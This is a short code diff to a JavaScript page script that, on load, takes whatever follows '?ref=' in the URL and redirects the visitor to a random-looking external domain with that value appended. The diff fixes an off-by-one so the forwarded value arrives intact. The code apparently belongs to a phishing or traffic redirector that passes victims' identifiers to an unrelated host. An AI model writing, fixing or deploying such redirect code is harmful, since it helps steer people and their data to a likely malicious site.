@@ -7,16 +7,14 @@
       const refParam = urlParams.get('ref');
 
       if (refParam !== null) {
-        // Get everything after "ref=" in the full URL (including additional params)
         const fullQuery = window.location.search;
         const refIndex = fullQuery.indexOf('?ref=');
         if (refIndex !== -1) {
-          const afterRef = fullQuery.substring(refIndex + 5 + 1); // skip '?ref='
-          const targetUrl = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/*' + afterRef;  // append only the value after `=`
+          const afterRef = fullQuery.substring(refIndex + 5); // only skip "?ref=" (5 chars)
+          const targetUrl = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/*' + afterRef;
           window.location.href = targetUrl;
         }
       } else {
-        // If no ref, optionally redirect normally
         window.location.href = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/';
       }
     };
